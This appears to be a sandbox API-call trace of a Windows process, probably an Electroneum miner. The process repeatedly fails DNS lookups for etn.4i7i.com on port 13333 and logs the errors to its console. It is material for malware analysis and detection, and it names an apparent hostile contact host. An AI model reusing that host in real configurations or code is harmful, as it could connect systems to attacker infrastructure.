GetSystemTimeAsFileTime,,0,1542888085.843
GetSystemTimeAsFileTime,,0,1542888085.937
GetSystemTimeAsFileTime,,0,1542888085.937
GetSystemTimeAsFileTime,,0,1542888085.937
GetSystemTimeAsFileTime,,0,1542888085.937
GetSystemTimeAsFileTime,,0,1542888085.937
GetSystemTimeAsFileTime,,0,1542888085.937
GetSystemTimeAsFileTime,,0,1542888085.937
GetSystemTimeAsFileTime,,0,1542888086.046
GetSystemTimeAsFileTime,,0,1542888086.25
GetSystemTimeAsFileTime,,0,1542888086.437
GetSystemTimeAsFileTime,,0,1542888086.437
GetSystemTimeAsFileTime,,0,1542888086.437
GetSystemTimeAsFileTime,,0,1542888086.437
GetSystemTimeAsFileTime,,0,1542888086.437
GetSystemTimeAsFileTime,,0,1542888086.437
GetSystemTimeAsFileTime,,0,1542888086.453
GetSystemTimeAsFileTime,,0,1542888086.656
GetSystemTimeAsFileTime,,0,1542888086.859
GetAddrInfoW,etn.4i7i.com#,11001,1542888086.921
GetSystemTimeAsFileTime,,0,1542888086.921
GetSystemTimeAsFileTime,,0,1542888086.921
GetSystemTimeAsFileTime,,0,1542888086.921
GetSystemTimeAsFileTime,,0,1542888086.921
GetSystemTimeAsFileTime,,0,1542888086.921
GetSystemTimeAsFileTime,,0,1542888086.921
GetSystemTimeAsFileTime,,0,1542888086.921
GetFileType,0x00000007,2,1542888086.921
WriteConsoleW,[2018-11-22 21:41:26]#0x0000000f,1,1542888086.921
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888086.921
GetSystemTimeAsFileTime,,0,1542888087.062
GetSystemTimeAsFileTime,,0,1542888087.265
GetSystemTimeAsFileTime,,0,1542888087.468
GetSystemTimeAsFileTime,,0,1542888087.468
GetSystemTimeAsFileTime,,0,1542888087.468
GetSystemTimeAsFileTime,,0,1542888087.468
GetSystemTimeAsFileTime,,0,1542888087.468
GetSystemTimeAsFileTime,,0,1542888087.468
GetSystemTimeAsFileTime,,0,1542888087.468
GetSystemTimeAsFileTime,,0,1542888087.671
GetSystemTimeAsFileTime,,0,1542888087.796
GetSystemTimeAsFileTime,,0,1542888087.796
GetSystemTimeAsFileTime,,0,1542888087.796
GetSystemTimeAsFileTime,,0,1542888087.796
GetSystemTimeAsFileTime,,0,1542888087.796
GetSystemTimeAsFileTime,,0,1542888087.796
GetSystemTimeAsFileTime,,0,1542888087.875
GetSystemTimeAsFileTime,,0,1542888088.078
GetSystemTimeAsFileTime,,0,1542888088.281
GetSystemTimeAsFileTime,,0,1542888088.296
GetSystemTimeAsFileTime,,0,1542888088.296
GetSystemTimeAsFileTime,,0,1542888088.296
GetSystemTimeAsFileTime,,0,1542888088.296
GetSystemTimeAsFileTime,,0,1542888088.296
GetSystemTimeAsFileTime,,0,1542888088.296
GetSystemTimeAsFileTime,,0,1542888088.484
GetSystemTimeAsFileTime,,0,1542888088.687
GetSystemTimeAsFileTime,,0,1542888088.89
GetSystemTimeAsFileTime,,0,1542888089.015
GetSystemTimeAsFileTime,,0,1542888089.015
GetSystemTimeAsFileTime,,0,1542888089.015
GetSystemTimeAsFileTime,,0,1542888089.015
GetSystemTimeAsFileTime,,0,1542888089.015
GetSystemTimeAsFileTime,,0,1542888089.015
GetSystemTimeAsFileTime,,0,1542888089.093
GetSystemTimeAsFileTime,,0,1542888089.296
GetSystemTimeAsFileTime,,0,1542888089.5
GetSystemTimeAsFileTime,,0,1542888089.531
GetSystemTimeAsFileTime,,0,1542888089.531
GetSystemTimeAsFileTime,,0,1542888089.531
GetSystemTimeAsFileTime,,0,1542888089.531
GetSystemTimeAsFileTime,,0,1542888089.531
GetSystemTimeAsFileTime,,0,1542888089.531
GetSystemTimeAsFileTime,,0,1542888089.703
GetSystemTimeAsFileTime,,0,1542888089.906
GetSystemTimeAsFileTime,,0,1542888090.109
GetSystemTimeAsFileTime,,0,1542888090.312
GetSystemTimeAsFileTime,,0,1542888090.343
GetSystemTimeAsFileTime,,0,1542888090.343
GetSystemTimeAsFileTime,,0,1542888090.343
GetSystemTimeAsFileTime,,0,1542888090.343
GetSystemTimeAsFileTime,,0,1542888090.343
GetSystemTimeAsFileTime,,0,1542888090.343
GetSystemTimeAsFileTime,,0,1542888090.515
GetSystemTimeAsFileTime,,0,1542888090.718
GetSystemTimeAsFileTime,,0,1542888090.843
GetSystemTimeAsFileTime,,0,1542888090.843
GetSystemTimeAsFileTime,,0,1542888090.843
GetSystemTimeAsFileTime,,0,1542888090.843
GetSystemTimeAsFileTime,,0,1542888090.843
GetSystemTimeAsFileTime,,0,1542888090.843
GetSystemTimeAsFileTime,,0,1542888090.921
GetSystemTimeAsFileTime,,0,1542888091.125
GetSystemTimeAsFileTime,,0,1542888091.328
GetSystemTimeAsFileTime,,0,1542888091.437
GetSystemTimeAsFileTime,,0,1542888091.437
GetSystemTimeAsFileTime,,0,1542888091.437
GetSystemTimeAsFileTime,,0,1542888091.437
GetSystemTimeAsFileTime,,0,1542888091.437
GetSystemTimeAsFileTime,,0,1542888091.437
GetSystemTimeAsFileTime,,0,1542888091.531
GetSystemTimeAsFileTime,,0,1542888091.734
GetSystemTimeAsFileTime,,0,1542888091.937
GetSystemTimeAsFileTime,,0,1542888091.937
GetSystemTimeAsFileTime,,0,1542888091.937
GetSystemTimeAsFileTime,,0,1542888091.937
GetSystemTimeAsFileTime,,0,1542888091.937
GetSystemTimeAsFileTime,,0,1542888091.937
GetSystemTimeAsFileTime,,0,1542888091.937
GetSystemTimeAsFileTime,,0,1542888092.14
GetSystemTimeAsFileTime,,0,1542888092.343
GetSystemTimeAsFileTime,,0,1542888092.437
GetSystemTimeAsFileTime,,0,1542888092.437
GetSystemTimeAsFileTime,,0,1542888092.437
GetSystemTimeAsFileTime,,0,1542888092.437
GetSystemTimeAsFileTime,,0,1542888092.437
GetSystemTimeAsFileTime,,0,1542888092.437
GetSystemTimeAsFileTime,,0,1542888092.546
GetSystemTimeAsFileTime,,0,1542888092.75
GetSystemTimeAsFileTime,,0,1542888092.953
GetSystemTimeAsFileTime,,0,1542888093.0
GetSystemTimeAsFileTime,,0,1542888093.0
GetSystemTimeAsFileTime,,0,1542888093.0
GetSystemTimeAsFileTime,,0,1542888093.0
GetSystemTimeAsFileTime,,0,1542888093.0
GetSystemTimeAsFileTime,,0,1542888093.0
GetSystemTimeAsFileTime,,0,1542888093.156
GetSystemTimeAsFileTime,,0,1542888093.359
GetSystemTimeAsFileTime,,0,1542888093.515
GetSystemTimeAsFileTime,,0,1542888093.515
GetSystemTimeAsFileTime,,0,1542888093.515
GetSystemTimeAsFileTime,,0,1542888093.515
GetSystemTimeAsFileTime,,0,1542888093.515
GetSystemTimeAsFileTime,,0,1542888093.515
GetSystemTimeAsFileTime,,0,1542888093.562
GetSystemTimeAsFileTime,,0,1542888093.765
GetSystemTimeAsFileTime,,0,1542888093.968
GetSystemTimeAsFileTime,,0,1542888094.031
GetSystemTimeAsFileTime,,0,1542888094.031
GetSystemTimeAsFileTime,,0,1542888094.031
GetSystemTimeAsFileTime,,0,1542888094.031
GetSystemTimeAsFileTime,,0,1542888094.031
GetSystemTimeAsFileTime,,0,1542888094.031
GetSystemTimeAsFileTime,,0,1542888094.171
GetSystemTimeAsFileTime,,0,1542888094.375
GetSystemTimeAsFileTime,,0,1542888094.546
GetSystemTimeAsFileTime,,0,1542888094.546
GetSystemTimeAsFileTime,,0,1542888094.546
GetSystemTimeAsFileTime,,0,1542888094.546
GetSystemTimeAsFileTime,,0,1542888094.546
GetSystemTimeAsFileTime,,0,1542888094.546
GetSystemTimeAsFileTime,,0,1542888094.546
GetSystemTimeAsFileTime,,0,1542888094.578
GetSystemTimeAsFileTime,,0,1542888094.781
GetSystemTimeAsFileTime,,0,1542888094.984
GetSystemTimeAsFileTime,,0,1542888095.046
GetSystemTimeAsFileTime,,0,1542888095.046
GetSystemTimeAsFileTime,,0,1542888095.046
GetSystemTimeAsFileTime,,0,1542888095.046
GetSystemTimeAsFileTime,,0,1542888095.046
GetSystemTimeAsFileTime,,0,1542888095.046
GetSystemTimeAsFileTime,,0,1542888095.187
GetAddrInfoW,etn.4i7i.com#,11001,1542888095.203
GetSystemTimeAsFileTime,,0,1542888095.203
GetFileType,0x00000007,2,1542888095.203
WriteConsoleW,[2018-11-22 21:41:35]#0x0000000f,1,1542888095.203
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888095.203
GetSystemTimeAsFileTime,,0,1542888095.39
GetSystemTimeAsFileTime,,0,1542888095.562
GetSystemTimeAsFileTime,,0,1542888095.562
GetSystemTimeAsFileTime,,0,1542888095.562
GetSystemTimeAsFileTime,,0,1542888095.562
GetSystemTimeAsFileTime,,0,1542888095.562
GetSystemTimeAsFileTime,,0,1542888095.562
GetSystemTimeAsFileTime,,0,1542888095.593
GetSystemTimeAsFileTime,,0,1542888095.796
GetSystemTimeAsFileTime,,0,1542888096.0
GetSystemTimeAsFileTime,,0,1542888096.078
GetSystemTimeAsFileTime,,0,1542888096.078
GetSystemTimeAsFileTime,,0,1542888096.078
GetSystemTimeAsFileTime,,0,1542888096.078
GetSystemTimeAsFileTime,,0,1542888096.078
GetSystemTimeAsFileTime,,0,1542888096.078
GetSystemTimeAsFileTime,,0,1542888096.203
GetSystemTimeAsFileTime,,0,1542888096.406
GetSystemTimeAsFileTime,,0,1542888096.593
GetSystemTimeAsFileTime,,0,1542888096.593
GetSystemTimeAsFileTime,,0,1542888096.593
GetSystemTimeAsFileTime,,0,1542888096.593
GetSystemTimeAsFileTime,,0,1542888096.593
GetSystemTimeAsFileTime,,0,1542888096.593
GetSystemTimeAsFileTime,,0,1542888096.609
GetSystemTimeAsFileTime,,0,1542888096.812
GetSystemTimeAsFileTime,,0,1542888097.015
GetSystemTimeAsFileTime,,0,1542888097.093
GetSystemTimeAsFileTime,,0,1542888097.093
GetSystemTimeAsFileTime,,0,1542888097.093
GetSystemTimeAsFileTime,,0,1542888097.093
GetSystemTimeAsFileTime,,0,1542888097.093
GetSystemTimeAsFileTime,,0,1542888097.093
GetSystemTimeAsFileTime,,0,1542888097.218
GetSystemTimeAsFileTime,,0,1542888097.421
GetSystemTimeAsFileTime,,0,1542888097.593
GetSystemTimeAsFileTime,,0,1542888097.593
GetSystemTimeAsFileTime,,0,1542888097.593
GetSystemTimeAsFileTime,,0,1542888097.593
GetSystemTimeAsFileTime,,0,1542888097.593
GetSystemTimeAsFileTime,,0,1542888097.593
GetSystemTimeAsFileTime,,0,1542888097.625
GetSystemTimeAsFileTime,,0,1542888097.828
GetSystemTimeAsFileTime,,0,1542888098.031
GetSystemTimeAsFileTime,,0,1542888098.234
GetSystemTimeAsFileTime,,0,1542888098.328
GetSystemTimeAsFileTime,,0,1542888098.328
GetSystemTimeAsFileTime,,0,1542888098.328
GetSystemTimeAsFileTime,,0,1542888098.328
GetSystemTimeAsFileTime,,0,1542888098.328
GetSystemTimeAsFileTime,,0,1542888098.328
GetSystemTimeAsFileTime,,0,1542888098.437
GetSystemTimeAsFileTime,,0,1542888098.64
GetSystemTimeAsFileTime,,0,1542888098.843
GetSystemTimeAsFileTime,,0,1542888099.046
GetSystemTimeAsFileTime,,0,1542888099.25
GetSystemTimeAsFileTime,,0,1542888099.25
GetSystemTimeAsFileTime,,0,1542888099.25
GetSystemTimeAsFileTime,,0,1542888099.25
GetSystemTimeAsFileTime,,0,1542888099.25
GetSystemTimeAsFileTime,,0,1542888099.25
GetSystemTimeAsFileTime,,0,1542888099.25
GetSystemTimeAsFileTime,,0,1542888099.453
GetSystemTimeAsFileTime,,0,1542888099.656
GetSystemTimeAsFileTime,,0,1542888099.859
GetSystemTimeAsFileTime,,0,1542888100.062
GetSystemTimeAsFileTime,,0,1542888100.265
GetSystemTimeAsFileTime,,0,1542888100.421
GetSystemTimeAsFileTime,,0,1542888100.421
GetSystemTimeAsFileTime,,0,1542888100.421
GetSystemTimeAsFileTime,,0,1542888100.421
GetSystemTimeAsFileTime,,0,1542888100.421
GetSystemTimeAsFileTime,,0,1542888100.421
GetSystemTimeAsFileTime,,0,1542888100.468
GetSystemTimeAsFileTime,,0,1542888100.671
GetSystemTimeAsFileTime,,0,1542888100.875
GetSystemTimeAsFileTime,,0,1542888101.078
GetSystemTimeAsFileTime,,0,1542888101.281
GetSystemTimeAsFileTime,,0,1542888101.484
GetSystemTimeAsFileTime,,0,1542888101.531
GetSystemTimeAsFileTime,,0,1542888101.531
GetSystemTimeAsFileTime,,0,1542888101.531
GetSystemTimeAsFileTime,,0,1542888101.531
GetSystemTimeAsFileTime,,0,1542888101.531
GetSystemTimeAsFileTime,,0,1542888101.531
GetSystemTimeAsFileTime,,0,1542888101.687
GetSystemTimeAsFileTime,,0,1542888101.89
GetSystemTimeAsFileTime,,0,1542888102.031
GetSystemTimeAsFileTime,,0,1542888102.031
GetSystemTimeAsFileTime,,0,1542888102.031
GetSystemTimeAsFileTime,,0,1542888102.031
GetSystemTimeAsFileTime,,0,1542888102.031
GetSystemTimeAsFileTime,,0,1542888102.031
GetSystemTimeAsFileTime,,0,1542888102.093
GetSystemTimeAsFileTime,,0,1542888102.296
GetSystemTimeAsFileTime,,0,1542888102.5
GetSystemTimeAsFileTime,,0,1542888102.531
GetSystemTimeAsFileTime,,0,1542888102.531
GetSystemTimeAsFileTime,,0,1542888102.531
GetSystemTimeAsFileTime,,0,1542888102.531
GetSystemTimeAsFileTime,,0,1542888102.531
GetSystemTimeAsFileTime,,0,1542888102.531
GetAddrInfoW,etn.4i7i.com#,11001,1542888102.671
GetSystemTimeAsFileTime,,0,1542888102.671
GetFileType,0x00000007,2,1542888102.671
WriteConsoleW,[2018-11-22 21:41:42]#0x0000000f,1,1542888102.671
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888102.671
GetSystemTimeAsFileTime,,0,1542888102.703
GetSystemTimeAsFileTime,,0,1542888102.906
GetSystemTimeAsFileTime,,0,1542888103.046
GetSystemTimeAsFileTime,,0,1542888103.046
GetSystemTimeAsFileTime,,0,1542888103.046
GetSystemTimeAsFileTime,,0,1542888103.046
GetSystemTimeAsFileTime,,0,1542888103.046
GetSystemTimeAsFileTime,,0,1542888103.046
GetSystemTimeAsFileTime,,0,1542888103.109
GetSystemTimeAsFileTime,,0,1542888103.312
GetSystemTimeAsFileTime,,0,1542888103.515
GetSystemTimeAsFileTime,,0,1542888103.546
GetSystemTimeAsFileTime,,0,1542888103.546
GetSystemTimeAsFileTime,,0,1542888103.546
GetSystemTimeAsFileTime,,0,1542888103.546
GetSystemTimeAsFileTime,,0,1542888103.546
GetSystemTimeAsFileTime,,0,1542888103.546
GetSystemTimeAsFileTime,,0,1542888103.718
GetSystemTimeAsFileTime,,0,1542888103.921
GetSystemTimeAsFileTime,,0,1542888104.031
GetSystemTimeAsFileTime,,0,1542888104.031
GetSystemTimeAsFileTime,,0,1542888104.031
GetSystemTimeAsFileTime,,0,1542888104.031
GetSystemTimeAsFileTime,,0,1542888104.031
GetSystemTimeAsFileTime,,0,1542888104.031
GetSystemTimeAsFileTime,,0,1542888104.125
GetSystemTimeAsFileTime,,0,1542888104.328
GetSystemTimeAsFileTime,,0,1542888104.531
GetSystemTimeAsFileTime,,0,1542888104.718
GetSystemTimeAsFileTime,,0,1542888104.718
GetSystemTimeAsFileTime,,0,1542888104.718
GetSystemTimeAsFileTime,,0,1542888104.718
GetSystemTimeAsFileTime,,0,1542888104.718
GetSystemTimeAsFileTime,,0,1542888104.718
GetSystemTimeAsFileTime,,0,1542888104.718
GetSystemTimeAsFileTime,,0,1542888104.734
NtDuplicateObject,0x00000210#0xffffffff#2516#2#0xffffffff#0x00000000#2516#0#0xfffffffe,0,1542888104.75
GetSystemTimeAsFileTime,,0,1542888104.937
GetSystemTimeAsFileTime,,0,1542888105.14
GetSystemTimeAsFileTime,,0,1542888105.234
GetSystemTimeAsFileTime,,0,1542888105.234
GetSystemTimeAsFileTime,,0,1542888105.234
GetSystemTimeAsFileTime,,0,1542888105.234
GetSystemTimeAsFileTime,,0,1542888105.234
GetSystemTimeAsFileTime,,0,1542888105.234
GetSystemTimeAsFileTime,,0,1542888105.343
GetSystemTimeAsFileTime,,0,1542888105.546
GetSystemTimeAsFileTime,,0,1542888105.734
GetSystemTimeAsFileTime,,0,1542888105.734
GetSystemTimeAsFileTime,,0,1542888105.734
GetSystemTimeAsFileTime,,0,1542888105.734
GetSystemTimeAsFileTime,,0,1542888105.734
GetSystemTimeAsFileTime,,0,1542888105.734
GetSystemTimeAsFileTime,,0,1542888105.75
GetSystemTimeAsFileTime,,0,1542888105.953
GetSystemTimeAsFileTime,,0,1542888106.156
GetSystemTimeAsFileTime,,0,1542888106.25
GetSystemTimeAsFileTime,,0,1542888106.25
GetSystemTimeAsFileTime,,0,1542888106.25
GetSystemTimeAsFileTime,,0,1542888106.25
GetSystemTimeAsFileTime,,0,1542888106.25
GetSystemTimeAsFileTime,,0,1542888106.25
GetSystemTimeAsFileTime,,0,1542888106.359
GetSystemTimeAsFileTime,,0,1542888106.562
GetSystemTimeAsFileTime,,0,1542888106.75
GetSystemTimeAsFileTime,,0,1542888106.75
GetSystemTimeAsFileTime,,0,1542888106.75
GetSystemTimeAsFileTime,,0,1542888106.75
GetSystemTimeAsFileTime,,0,1542888106.75
GetSystemTimeAsFileTime,,0,1542888106.75
GetSystemTimeAsFileTime,,0,1542888106.765
GetSystemTimeAsFileTime,,0,1542888106.968
GetSystemTimeAsFileTime,,0,1542888107.171
GetSystemTimeAsFileTime,,0,1542888107.265
GetSystemTimeAsFileTime,,0,1542888107.265
GetSystemTimeAsFileTime,,0,1542888107.265
GetSystemTimeAsFileTime,,0,1542888107.265
GetSystemTimeAsFileTime,,0,1542888107.265
GetSystemTimeAsFileTime,,0,1542888107.265
GetSystemTimeAsFileTime,,0,1542888107.375
GetSystemTimeAsFileTime,,0,1542888107.578
GetSystemTimeAsFileTime,,0,1542888107.781
GetSystemTimeAsFileTime,,0,1542888107.781
GetSystemTimeAsFileTime,,0,1542888107.781
GetSystemTimeAsFileTime,,0,1542888107.781
GetSystemTimeAsFileTime,,0,1542888107.781
GetSystemTimeAsFileTime,,0,1542888107.781
GetSystemTimeAsFileTime,,0,1542888107.781
GetSystemTimeAsFileTime,,0,1542888107.984
GetSystemTimeAsFileTime,,0,1542888108.187
GetSystemTimeAsFileTime,,0,1542888108.281
GetSystemTimeAsFileTime,,0,1542888108.281
GetSystemTimeAsFileTime,,0,1542888108.281
GetSystemTimeAsFileTime,,0,1542888108.281
GetSystemTimeAsFileTime,,0,1542888108.281
GetSystemTimeAsFileTime,,0,1542888108.281
GetSystemTimeAsFileTime,,0,1542888108.39
GetSystemTimeAsFileTime,,0,1542888108.593
GetSystemTimeAsFileTime,,0,1542888108.796
GetSystemTimeAsFileTime,,0,1542888108.796
GetSystemTimeAsFileTime,,0,1542888108.796
GetSystemTimeAsFileTime,,0,1542888108.796
GetSystemTimeAsFileTime,,0,1542888108.796
GetSystemTimeAsFileTime,,0,1542888108.796
GetSystemTimeAsFileTime,,0,1542888108.796
GetSystemTimeAsFileTime,,0,1542888109.0
GetSystemTimeAsFileTime,,0,1542888109.203
GetSystemTimeAsFileTime,,0,1542888109.312
GetSystemTimeAsFileTime,,0,1542888109.312
GetSystemTimeAsFileTime,,0,1542888109.312
GetSystemTimeAsFileTime,,0,1542888109.312
GetSystemTimeAsFileTime,,0,1542888109.312
GetSystemTimeAsFileTime,,0,1542888109.312
GetSystemTimeAsFileTime,,0,1542888109.406
GetSystemTimeAsFileTime,,0,1542888109.609
GetSystemTimeAsFileTime,,0,1542888109.812
GetSystemTimeAsFileTime,,0,1542888109.828
GetSystemTimeAsFileTime,,0,1542888109.828
GetSystemTimeAsFileTime,,0,1542888109.828
GetSystemTimeAsFileTime,,0,1542888109.828
GetSystemTimeAsFileTime,,0,1542888109.828
GetSystemTimeAsFileTime,,0,1542888109.828
GetSystemTimeAsFileTime,,0,1542888110.015
GetSystemTimeAsFileTime,,0,1542888110.218
GetSystemTimeAsFileTime,,0,1542888110.343
GetSystemTimeAsFileTime,,0,1542888110.343
GetSystemTimeAsFileTime,,0,1542888110.343
GetSystemTimeAsFileTime,,0,1542888110.343
GetSystemTimeAsFileTime,,0,1542888110.343
GetSystemTimeAsFileTime,,0,1542888110.343
GetSystemTimeAsFileTime,,0,1542888110.421
GetAddrInfoW,etn.4i7i.com#,11001,1542888110.5
GetSystemTimeAsFileTime,,0,1542888110.5
GetFileType,0x00000007,2,1542888110.5
WriteConsoleW,[2018-11-22 21:41:50]#0x0000000f,1,1542888110.5
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888110.5
GetSystemTimeAsFileTime,,0,1542888110.625
GetSystemTimeAsFileTime,,0,1542888110.828
GetSystemTimeAsFileTime,,0,1542888110.843
GetSystemTimeAsFileTime,,0,1542888110.843
GetSystemTimeAsFileTime,,0,1542888110.843
GetSystemTimeAsFileTime,,0,1542888110.843
GetSystemTimeAsFileTime,,0,1542888110.843
GetSystemTimeAsFileTime,,0,1542888110.843
GetSystemTimeAsFileTime,,0,1542888111.031
GetSystemTimeAsFileTime,,0,1542888111.234
GetSystemTimeAsFileTime,,0,1542888111.359
GetSystemTimeAsFileTime,,0,1542888111.359
GetSystemTimeAsFileTime,,0,1542888111.359
GetSystemTimeAsFileTime,,0,1542888111.359
GetSystemTimeAsFileTime,,0,1542888111.359
GetSystemTimeAsFileTime,,0,1542888111.359
GetSystemTimeAsFileTime,,0,1542888111.437
GetSystemTimeAsFileTime,,0,1542888111.64
GetSystemTimeAsFileTime,,0,1542888111.843
GetSystemTimeAsFileTime,,0,1542888111.859
GetSystemTimeAsFileTime,,0,1542888111.859
GetSystemTimeAsFileTime,,0,1542888111.859
GetSystemTimeAsFileTime,,0,1542888111.859
GetSystemTimeAsFileTime,,0,1542888111.859
GetSystemTimeAsFileTime,,0,1542888111.859
GetSystemTimeAsFileTime,,0,1542888112.046
GetSystemTimeAsFileTime,,0,1542888112.25
GetSystemTimeAsFileTime,,0,1542888112.375
GetSystemTimeAsFileTime,,0,1542888112.375
GetSystemTimeAsFileTime,,0,1542888112.375
GetSystemTimeAsFileTime,,0,1542888112.375
GetSystemTimeAsFileTime,,0,1542888112.375
GetSystemTimeAsFileTime,,0,1542888112.375
GetSystemTimeAsFileTime,,0,1542888112.453
GetSystemTimeAsFileTime,,0,1542888112.656
GetSystemTimeAsFileTime,,0,1542888112.859
GetSystemTimeAsFileTime,,0,1542888112.875
GetSystemTimeAsFileTime,,0,1542888112.875
GetSystemTimeAsFileTime,,0,1542888112.875
GetSystemTimeAsFileTime,,0,1542888112.875
GetSystemTimeAsFileTime,,0,1542888112.875
GetSystemTimeAsFileTime,,0,1542888112.875
GetSystemTimeAsFileTime,,0,1542888112.875
GetSystemTimeAsFileTime,,0,1542888113.062
GetSystemTimeAsFileTime,,0,1542888113.265
GetSystemTimeAsFileTime,,0,1542888113.39
GetSystemTimeAsFileTime,,0,1542888113.39
GetSystemTimeAsFileTime,,0,1542888113.39
GetSystemTimeAsFileTime,,0,1542888113.39
GetSystemTimeAsFileTime,,0,1542888113.39
GetSystemTimeAsFileTime,,0,1542888113.39
GetSystemTimeAsFileTime,,0,1542888113.468
GetSystemTimeAsFileTime,,0,1542888113.671
GetSystemTimeAsFileTime,,0,1542888113.875
GetSystemTimeAsFileTime,,0,1542888113.906
GetSystemTimeAsFileTime,,0,1542888113.906
GetSystemTimeAsFileTime,,0,1542888113.906
GetSystemTimeAsFileTime,,0,1542888113.906
GetSystemTimeAsFileTime,,0,1542888113.906
GetSystemTimeAsFileTime,,0,1542888113.906
GetSystemTimeAsFileTime,,0,1542888114.078
GetSystemTimeAsFileTime,,0,1542888114.281
GetSystemTimeAsFileTime,,0,1542888114.406
GetSystemTimeAsFileTime,,0,1542888114.406
GetSystemTimeAsFileTime,,0,1542888114.406
GetSystemTimeAsFileTime,,0,1542888114.406
GetSystemTimeAsFileTime,,0,1542888114.406
GetSystemTimeAsFileTime,,0,1542888114.406
GetSystemTimeAsFileTime,,0,1542888114.484
GetSystemTimeAsFileTime,,0,1542888114.687
GetSystemTimeAsFileTime,,0,1542888114.89
GetSystemTimeAsFileTime,,0,1542888114.906
GetSystemTimeAsFileTime,,0,1542888114.906
GetSystemTimeAsFileTime,,0,1542888114.906
GetSystemTimeAsFileTime,,0,1542888114.906
GetSystemTimeAsFileTime,,0,1542888114.906
GetSystemTimeAsFileTime,,0,1542888114.906
GetSystemTimeAsFileTime,,0,1542888115.093
GetSystemTimeAsFileTime,,0,1542888115.296
GetSystemTimeAsFileTime,,0,1542888115.421
GetSystemTimeAsFileTime,,0,1542888115.421
GetSystemTimeAsFileTime,,0,1542888115.421
GetSystemTimeAsFileTime,,0,1542888115.421
GetSystemTimeAsFileTime,,0,1542888115.421
GetSystemTimeAsFileTime,,0,1542888115.421
GetSystemTimeAsFileTime,,0,1542888115.5
GetSystemTimeAsFileTime,,0,1542888115.703
GetSystemTimeAsFileTime,,0,1542888115.906
GetSystemTimeAsFileTime,,0,1542888115.921
GetSystemTimeAsFileTime,,0,1542888115.921
GetSystemTimeAsFileTime,,0,1542888115.921
GetSystemTimeAsFileTime,,0,1542888115.921
GetSystemTimeAsFileTime,,0,1542888115.921
GetSystemTimeAsFileTime,,0,1542888115.921
GetSystemTimeAsFileTime,,0,1542888116.109
GetSystemTimeAsFileTime,,0,1542888116.312
GetSystemTimeAsFileTime,,0,1542888116.421
GetSystemTimeAsFileTime,,0,1542888116.421
GetSystemTimeAsFileTime,,0,1542888116.421
GetSystemTimeAsFileTime,,0,1542888116.421
GetSystemTimeAsFileTime,,0,1542888116.421
GetSystemTimeAsFileTime,,0,1542888116.421
GetSystemTimeAsFileTime,,0,1542888116.515
GetSystemTimeAsFileTime,,0,1542888116.718
GetSystemTimeAsFileTime,,0,1542888116.921
GetSystemTimeAsFileTime,,0,1542888116.921
GetSystemTimeAsFileTime,,0,1542888116.921
GetSystemTimeAsFileTime,,0,1542888116.921
GetSystemTimeAsFileTime,,0,1542888116.921
GetSystemTimeAsFileTime,,0,1542888116.921
GetSystemTimeAsFileTime,,0,1542888116.921
GetSystemTimeAsFileTime,,0,1542888117.125
GetSystemTimeAsFileTime,,0,1542888117.328
GetSystemTimeAsFileTime,,0,1542888117.437
GetSystemTimeAsFileTime,,0,1542888117.437
GetSystemTimeAsFileTime,,0,1542888117.437
GetSystemTimeAsFileTime,,0,1542888117.437
GetSystemTimeAsFileTime,,0,1542888117.437
GetSystemTimeAsFileTime,,0,1542888117.437
GetSystemTimeAsFileTime,,0,1542888117.531
GetSystemTimeAsFileTime,,0,1542888117.734
GetSystemTimeAsFileTime,,0,1542888117.937
GetSystemTimeAsFileTime,,0,1542888117.953
GetSystemTimeAsFileTime,,0,1542888117.953
GetSystemTimeAsFileTime,,0,1542888117.953
GetSystemTimeAsFileTime,,0,1542888117.953
GetSystemTimeAsFileTime,,0,1542888117.953
GetSystemTimeAsFileTime,,0,1542888117.953
GetSystemTimeAsFileTime,,0,1542888118.14
GetSystemTimeAsFileTime,,0,1542888118.343
GetSystemTimeAsFileTime,,0,1542888118.468
GetSystemTimeAsFileTime,,0,1542888118.468
GetSystemTimeAsFileTime,,0,1542888118.468
GetSystemTimeAsFileTime,,0,1542888118.468
GetSystemTimeAsFileTime,,0,1542888118.468
GetSystemTimeAsFileTime,,0,1542888118.468
GetAddrInfoW,etn.4i7i.com#,11001,1542888118.546
GetSystemTimeAsFileTime,,0,1542888118.546
GetSystemTimeAsFileTime,,0,1542888118.546
GetFileType,0x00000007,2,1542888118.546
WriteConsoleW,[2018-11-22 21:41:58]#0x0000000f,1,1542888118.546
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888118.546
GetSystemTimeAsFileTime,,0,1542888118.75
GetSystemTimeAsFileTime,,0,1542888118.953
GetSystemTimeAsFileTime,,0,1542888118.984
GetSystemTimeAsFileTime,,0,1542888118.984
GetSystemTimeAsFileTime,,0,1542888118.984
GetSystemTimeAsFileTime,,0,1542888118.984
GetSystemTimeAsFileTime,,0,1542888118.984
GetSystemTimeAsFileTime,,0,1542888118.984
GetSystemTimeAsFileTime,,0,1542888119.156
GetSystemTimeAsFileTime,,0,1542888119.359
GetSystemTimeAsFileTime,,0,1542888119.484
GetSystemTimeAsFileTime,,0,1542888119.484
GetSystemTimeAsFileTime,,0,1542888119.484
GetSystemTimeAsFileTime,,0,1542888119.484
GetSystemTimeAsFileTime,,0,1542888119.484
GetSystemTimeAsFileTime,,0,1542888119.484
GetSystemTimeAsFileTime,,0,1542888119.562
GetSystemTimeAsFileTime,,0,1542888119.765
GetSystemTimeAsFileTime,,0,1542888119.968
GetSystemTimeAsFileTime,,0,1542888120.0
GetSystemTimeAsFileTime,,0,1542888120.0
GetSystemTimeAsFileTime,,0,1542888120.0
GetSystemTimeAsFileTime,,0,1542888120.0
GetSystemTimeAsFileTime,,0,1542888120.0
GetSystemTimeAsFileTime,,0,1542888120.0
GetSystemTimeAsFileTime,,0,1542888120.171
GetSystemTimeAsFileTime,,0,1542888120.375
GetSystemTimeAsFileTime,,0,1542888120.5
GetSystemTimeAsFileTime,,0,1542888120.5
GetSystemTimeAsFileTime,,0,1542888120.5
GetSystemTimeAsFileTime,,0,1542888120.5
GetSystemTimeAsFileTime,,0,1542888120.5
GetSystemTimeAsFileTime,,0,1542888120.5
GetSystemTimeAsFileTime,,0,1542888120.578
GetSystemTimeAsFileTime,,0,1542888120.781
GetSystemTimeAsFileTime,,0,1542888120.984
GetSystemTimeAsFileTime,,0,1542888121.015
